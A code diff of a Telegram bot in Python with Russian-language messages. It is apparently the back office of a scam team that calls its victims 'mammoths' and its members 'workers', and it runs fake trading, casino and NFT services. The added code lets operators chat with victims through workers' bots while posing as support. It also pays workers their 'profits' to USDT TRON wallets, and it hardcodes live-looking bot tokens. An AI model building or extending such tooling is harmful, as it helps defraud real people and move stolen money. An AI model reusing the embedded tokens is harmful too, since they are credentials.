@@ -11,20 +11,27 @@ from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.dispatcher import FSMContext
 from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
 from aiogram.dispatcher.filters.state import State, StatesGroup
-from db import Worker, session, Mammoth, Withdraws
+from db import Worker, session, Mammoth, Withdraws, Payouts
 from img import generate_profile_stats_for_worker
 from test import create_mirror
 from aiobotocore.session import get_session
 import requests
+from  diction import active_chats
+from config_for_bots import payout_for_admins_bot_token
+from payoutbot import create_mirror_of_payout_bot
 admin_chat_id  = '881704893'
 #API_TOKEN = '6686215620:AAHPv-qUVFsAKH4ShiaGNfZWd0fHVYCX2qg'
-API_TOKEN = '6686215620:AAGZ4kY1EjNHu4zwP0XQDtiu9GbqYnlL3cE'
+API_TOKEN = '6425684889:AAF-oxFqykctlFHJWUzuv0O9lHXiqq_rm78'
 from aws import  sqs
 logging.basicConfig(level=logging.INFO)
+import threading
 
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
+
+
+support_team = ['881704893']
 
 
 def withdraw_actions(withdraw_id):
@@ -45,6 +52,57 @@ all_mammonts = session.query(Mammoth).all()
 
 class DistributeStates(StatesGroup):
     first = State()
+
+@dp.message_handler(commands=['stop_chat'])
+async def stop_chat(message:types.Message):
+    mammonth_id = active_chats[message.from_user.id]
+    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
+    token = session.query(Worker).filter(Worker.telegram_id == mammonth.belongs_to_worker).first().token
+    data = {'chat_id': mammonth_id, 'text': 'Оператор разорвал соединение с вами'}
+    del active_chats[message.from_user.id]
+    requests.post(url=f'https://api.telegram.org/bot{token}/sendMessage', data=data)
+    await message.answer('Вы разорвали соединение с юзером')
+
+@dp.message_handler(lambda message: message.chat.id in active_chats)
+async def forward_message(message: types.Message):
+    await message.answer(f'{message.chat.id}')
+
+    mammonth_id = active_chats[message.chat.id]
+    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
+    worker = session.query(Worker).filter(Worker.telegram_id == mamonth.belongs_to_worker).first()
+    data = {'chat_id': mamonth.telegram_id, 'text': message.text}
+    requests.post(url=f'https://api.telegram.org/bot{worker.token}/sendMessage', data=data)
+    await message.answer(f'{active_chats}')
+    await message.answer('Сообщение отослано')
+@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('open_support_case_with_mammonth'))
+async def handle_support_case_with_mammonth(query: types.CallbackQuery):
+    mammonth_id = (query.data.split('_')[-1])
+    for operator, mammonth in active_chats.items():
+        if int(active_chats.get(operator)) == int(mammonth_id):
+            await query.message.answer('Другой оператор уже общается с маммонтом!')
+            return 0
+
+    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
+    worker = session.query(Worker).filter(Worker.telegram_id == mamonth.belongs_to_worker).first()
+    mamonth.was_using_support = True
+    session.commit()
+    await query.message.answer(f'{worker.token}, {mamonth.telegram_id}, {type(mamonth.telegram_id)} {mammonth_id}')
+    inline_keyboard = {
+        "inline_keyboard": [
+            [
+                {"text": "Начать чат", "callback_data": f"start_chat_with_operator_{query.from_user.id}"},
+
+            ]
+        ]
+
+    }
+    data = {'chat_id': mamonth.telegram_id,
+            'text': f'Оператор найден! нажмите кнопку *Начать чат*.Отправляйте только текстовые сообщения.Чтобы закончить чат - введите команду /stop_chat',
+            "reply_markup":  inline_keyboard}
+    response = requests.post(url=f'https://api.telegram.org/bot{worker.token}/sendMessage', json=data)
+    await query.message.answer(f'{response.text}, {inline_keyboard}')
+    active_chats[query.from_user.id] = query.data.split('_')[-1]
+    await query.message.answer(f'Вы начали чат с пользователем {mammonth_id}. Чтобы закончить - введите комманду /stop_chat')
 
 @dp.callback_query_handler(lambda callback_query: callback_query.data=='distribute')
 async def handle_mammonths_distribute(query:types.CallbackQuery):
@@ -77,7 +135,7 @@ Telegram ID: `{mammonth.telegram_id}`
 ID мамонта: *t{mammonth.service_id}*
 Имя: {mammonth.first_name}
 
-Баланс: {mammonth.balance}₽
+Баланс: {round(mammonth.balance,2)}₽
 На выводе: {mammonth.on_output} ₽
 Валюта: RUB
     '''
@@ -199,7 +257,7 @@ async def process_sqs_messages():
                     f'''💹 Новая заявка на пополнение! (Трейдинг)
                     
 
-🐘 Мамонт: {msg_attributes['FirstName']['Value']} [/{msg_attributes['MammonthId']['Value']}]!!
+🐘 Мамонт: {msg_attributes['FirstName']['Value']} [/t{msg_attributes['MammonthId']['Value']}]!!
 💳 Сумма: {msg_attributes['Sum']['Value']} RUB
                 ''', reply_markup=create_top_up_mammonths_balance_button(mammonths_telegram_id=msg_attributes['MammonthId']['Value'], amount=msg_attributes['Sum']['Value'])
                 )
@@ -303,7 +361,117 @@ def after_mamonts_management():
     kb.add(InlineKeyboardButton('Настройки', callback_data='mammonts_settings'))
     return kb
 
-    # Создаем клавиатуру
+
+inline_kb_for_payouts = InlineKeyboardMarkup()
+inline_kb_for_payouts.add(InlineKeyboardButton('Подтвердить вывод', callback_data='approve_payout'))
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data == 'approve_payout')
+async def approve_payout_handler(query:types.CallbackQuery):
+    await PayoutForWorkerStates.first.set()
+    await query.message.answer('Введите сумму в RUB, которую вы хотите вывести ')
+
+
+
+class PayoutForWorkerStates(StatesGroup):
+    first = State()
+    second = State()
+
+@dp.message_handler(state=PayoutForWorkerStates.first)
+async def payout_for_worker_states(message:types.Message, state:FSMContext):
+    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
+    try:
+
+        if float(message.text) <= worker.balance:
+            state1 = dp.current_state(chat=message.chat.id, user=message.from_user.id)
+            data = {}
+            data['worker_id'] = int(message.from_user.id)
+            data['amount'] = float(message.text)
+            await state1.set_data(data)
+            await  PayoutForWorkerStates.second.set()
+            await message.answer('Введите адрес вашего кошелька USDT в сети TRON')
+
+        else:
+            await message.answer('На вашем балансе не хватает денег для исполнения операции, попробуйте еще раз')
+            await state.finish()
+    except Exception as ex:
+        await message.answer('Неправильно введенный формат числа, попробуйте еще раз')
+        await state.finish()
+
+
+def keyboard_to_approve_payout(order_id):
+    kb = InlineKeyboardMarkup()
+    return kb.add(InlineKeyboardButton('Да!', callback_data=f'yes_{order_id}')).add(InlineKeyboardButton('Нет', callback_data=f'no_{order_id}'))
+@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('yes_') or callback_query.data.startswith('no_'))
+async def handle_approving_or_disapproving_of_payout(query:types.CallbackQuery):
+    order_id = query.data.split('_')[1]
+    payout  = session.query(Payouts).filter(Payouts.order_id == order_id).first()
+    worker = session.query(Worker).filter(Worker.telegram_id == query.from_user.id).first()
+    if query.data.startswith('yes_'):
+        await query.message.answer('Ваша заявка была подана на рассмотрение. Ожидайте')
+        inline_keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "Принять", "callback_data": f"approve_payout_{order_id}"},
+                    {"text": "Отклонить", "callback_data": f"disapprove_payout_{order_id}"}
+                ]
+            ]
+
+        }
+        data_For_tg = {
+            "chat_id": support_team[0],
+            "text": f"""
+Новая заявка на вывод
+Воркер {worker.name} с айди {worker.telegram_id} хочет вывести {payout.amount} RUB на адрес {payout.address}""",
+            "reply_markup": inline_keyboard,
+
+        }
+        await query.message.answer(f'''{requests.post(f'https://api.telegram.org/bot{payout_for_admins_bot_token}/sendMessage', json=data_For_tg).text}''')
+
+    else:
+        session.delete(payout)
+        await query.message.answer('Ваша заявка была успешно удалена!')
+    session.commit()
+@dp.message_handler(state=PayoutForWorkerStates.second)
+async def payout_for_worker_states_second_handler(message:types.Message,state:FSMContext):
+    data = await state.get_data()
+    response = requests.get('https://apilist.tronscan.io/api/account?address='+message.text)
+    await state.finish()
+    try:
+        address = response.json()['activePermissions'][0]['keys'][0]['address']
+        payout = Payouts(worker_id = message.from_user.id, amount = data['amount'], address = address)
+        session.add(payout)
+        session.commit()
+        await message.answer(f'''
+Адрес кошелька - `{address}`
+Сумма вывода - *{data['amount']} RUB*
+Все правильно?
+
+''', reply_markup=keyboard_to_approve_payout(payout.order_id), parse_mode=ParseMode.MARKDOWN)
+        await state.finish()
+    except:
+        await message.answer('Вы ввели несуществующий адрес')
+        await state.finish()
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data == 'payout_for_worker')
+async def payout_for_worker_handler(query:types.CallbackQuery):
+    worker = session.query(Worker).filter(Worker.telegram_id == query.from_user.id).first()
+    if session.query(Payouts).filter(Payouts.worker_id == query.from_user.id).first():
+        await query.message.answer('Ваша заявка уже на рассмотрении. Нельзя создавать новые заявки на вывод, пока на рассмотрении есть другие')
+        return
+    if worker.balance >= 2000:
+        await query.message.answer(f'''
+Для вывода у вас доступно *{worker.balance}* RUB
+Вывод доступен только на *криптовалютный кошелёк USDT в сети TRON*.
+Нажмите кнопку _Подтвердить вывод_ чтоб создать заявку на вывод средств.
+''', parse_mode=ParseMode.MARKDOWN, reply_markup= inline_kb_for_payouts)
+    else:
+        await query.message.answer(f'''
+Вывод доступен только с 2000 RUB на вашем балансе
+Ваш баланс сейчас - *{worker.balance}*
+''', parse_mode=ParseMode.MARKDOWN)
+markup_for_payout = InlineKeyboardMarkup()
+markup_for_payout.add(InlineKeyboardButton('Вывести средства', callback_data='payout_for_worker'))
+
 markup = ReplyKeyboardMarkup(resize_keyboard=True)
 
     # Создаем кнопки и добавляем их к клавиатуре
@@ -327,7 +495,10 @@ def create_markup_for_trading():
     return markup_for_trading
 @dp.message_handler(lambda message: message.text in ["Профиль 🐳", "NFT 💠", "Трейдинг 📊", "Казино 🎰", "Арбитраж 🌐", "О проекте 👨‍💻"])
 async def handle_menu(message: types.Message):
-    # Обработка нажатия кнопок
+    user = session.query(Worker).filter(Worker.telegram_id==message.from_user.id).first()
+    if not user:
+        await message.answer('Авторизуйтесь чтобы получить доступ к функциям воркеров')
+        return
     if message.text == "Профиль 🐳":
         await showprofile(message)
     elif message.text == "NFT 💠":
@@ -338,10 +509,7 @@ async def handle_menu(message: types.Message):
 📊 Трейдинг
 
 📋 Ваш код: `{service_id}`
-
-💳 Ваши фейк реквизиты: ???
-
-🔗 Ваша реферальная ссылка:&&)
+🔗 Ваша реферальная ссылка: [НАЖМИ И СКОПИРУЙ](https://t.me/CasiktriBot?start={service_id})
         
         
         
@@ -364,9 +532,9 @@ async def showprofile(message: types.Message):
 Код для сервисов: {worker.service_id}
 
 💸 У тебя {worker.profit_quantity} профитов на сумму {worker.profit} RUB
-Средний профит 0 RUB
+Средний профит {(lambda profit, profit_quantity: 0 if profit_quantity == 0 else profit / profit_quantity)(worker.profit, worker.profit_quantity)} RUB
 
-Приглашено: {len(session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all())} воркеров
+Приглашено: {len(session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all())} маммонтов
 Баланс: {worker.balance} RUB
 Статус: Воркер
 Предупреждений: [{worker.warnings}/3]
@@ -380,12 +548,24 @@ async def showprofile(message: types.Message):
     
     """
 
-
+    await message.answer('⚡', reply_markup=markup)
     with open(f'{worker.telegram_id}.png', 'rb') as img:
-        await bot.send_photo(chat_id=message.chat.id, photo=InputFile(img), caption=caption, reply_markup=markup)
+        await bot.send_photo(chat_id=message.chat.id, photo=InputFile(img), caption=caption, reply_markup=markup_for_payout)
 
 @dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
+    mirror_bot_threadw = threading.Thread(target=create_mirror_of_payout_bot, args=('6415616043:AAHT0EMBrRCFnefpnJGUlefszGGRrRVCvns',))
+    mirror_bot_threadw.start()
+    try:
+        service_id = int(message.get_args())
+        worker = session.query(Worker).filter(Worker.service_id == service_id).first()
+        worker.invited_worker += f'{message.from_user.id},'
+        session.commit()
+
+        await bot.send_message(chat_id= worker.telegram_id,text = 'По вашей реферальной ссылке перешел новый воркер!')
+    except Exception as ex:
+        'ok'
+
     if not session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first():
     # Текст с правилами
         rules_text = """
